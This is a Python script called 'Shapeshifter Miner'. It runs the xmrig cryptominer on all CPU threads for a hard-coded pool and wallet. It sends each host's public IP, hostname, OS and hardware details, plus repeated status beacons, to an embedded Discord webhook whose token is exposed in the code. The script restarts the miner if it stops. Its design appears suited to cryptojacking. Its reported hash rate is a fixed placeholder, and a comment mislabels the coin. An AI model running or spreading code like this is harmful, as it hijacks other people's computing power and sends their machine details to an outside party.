import os
import platform
import subprocess
import time
import socket

# --- Configuration ---
WEBHOOK = "https://discord.com/api/webhooks/1395138384518844508/riuLCmuUuVfVZECJE-zW75VwARH2p9jd8yP_Z1ndjP4gvNMH08Mf7C9PpXcITM-nmw8B"  # Discord Webhook URL
WALLET = "ZEPHYR2zxTXUfUEtvhU5QSDjPPBq6XtoU8faeFj3mTEr5hWs5zERHsXT9xc6ivLNMmbbQvxWvGUaxAyyLv3Cnbb9MgemKUED19M2b"  # Monero Wallet Address
POOL = "fr.zephyr.herominers.com:1123"  # Mining Pool URL
WORKER_NAME = "worker001"  # Worker Name (can be set to any name)

# --- Script Logic ---
def get_system_info():
    """Gather basic system information for Discord webhook"""
    system_info = {
        "IP": subprocess.getoutput("curl -s https://api.ipify.org"),
        "Hostname": socket.gethostname(),
        "OS": platform.system() + " " + platform.release(),
        "Arch": platform.machine(),
        "CPU": subprocess.getoutput("lscpu | grep 'Model name' | cut -d ':' -f2").strip(),
        "RAM": subprocess.getoutput("free -h | awk '/Mem/ {print $2}'").strip(),
        "Threads": str(os.cpu_count()),
    }
    return system_info

def send_notification(message):
    """Send a notification to Discord webhook"""
    try:
        subprocess.run(['curl', '-X', 'POST', WEBHOOK, '--data', f'{{"content": "{message}"}}'])
    except Exception as e:
        print(f"Error sending notification: {e}")

def get_hash_rate():
    """Retrieve current hash rate (simulated for Monero in this example)"""
    hash_rate = "100 H/s"  # This is a simulated value, replace with actual hash rate fetching logic
    return hash_rate

def start_miner():
    """Start the mining process"""
    try:
        cmd = ["xmrig", "-o", POOL, "-u", WALLET, "--donate-level", "1", "-k", "-t", str(os.cpu_count())]
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return process
    except Exception as e:
        send_notification(f"❌ Miner failed to start: {e}")
        raise

def monitor_miner(process):
    """Monitor the miner process and restart if needed"""
    try:
        stdout, stderr = process.communicate(timeout=10)  # Check for any miner output
        if process.returncode != 0:
            send_notification(f"❌ Miner error: {stderr.decode()}")
            return False
        return True
    except subprocess.TimeoutExpired:
        return True  # Miner is still running
    except Exception as e:
        send_notification(f"❌ Miner crash detected: {e}")
        return False

def main():
    """Main script loop"""
    send_notification("🚀 Shapeshifter Miner starting...")
    system_info = get_system_info()
    message = f"✅ Miner Initialized\nIP: {system_info['IP']}\nHostname: {system_info['Hostname']}\nOS: {system_info['OS']}\nCPU: {system_info['CPU']}\nRAM: {system_info['RAM']}\nThreads: {system_info['Threads']}\nWorker: {WORKER_NAME}"
    send_notification(message)

    miner_process = start_miner()

    # Watchdog loop with 5 minute interval
    while True:
        time.sleep(300)  # 5 minutes delay

        # Check the mining status and hash rate
        hash_rate = get_hash_rate()
        message = f"🧠 Mining Update\nHash Rate: {hash_rate}\nWorker: {WORKER_NAME}"
        send_notification(message)

        # Monitor miner process
        if not monitor_miner(miner_process):
            send_notification("🔁 Miner restarting...")
            miner_process = start_miner()

if __name__ == "__main__":
    main()
